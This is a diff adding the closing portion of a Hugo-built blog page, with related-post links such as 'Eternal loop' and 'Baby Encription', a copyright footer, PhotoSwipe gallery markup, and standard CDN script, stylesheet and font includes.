+            <h2 class="article-title">Eternal loop</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/p/baby-encription/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Baby Encription</h2>
+        </div>
+    </a>
+</article>
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2018 - 
+        
+        2023 phire heavy industries
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.11.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
